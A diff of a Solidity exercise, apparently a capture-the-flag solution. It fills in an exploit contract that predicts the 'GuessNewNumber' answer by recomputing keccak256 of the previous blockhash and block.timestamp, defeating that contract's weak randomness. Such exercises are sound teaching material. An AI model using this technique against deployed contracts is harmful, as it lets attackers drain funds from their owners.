@@ -1,6 +1,8 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
+import {console} from "forge-std/console.sol";
+
 contract GuessNewNumber {
     constructor() payable {
         require(msg.value == 1 ether);
@@ -28,6 +30,8 @@ contract ExploitContract {
     uint8 public answer;
 
     function Exploit() public returns (uint8) {
+        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+
         return answer;
     }
 }
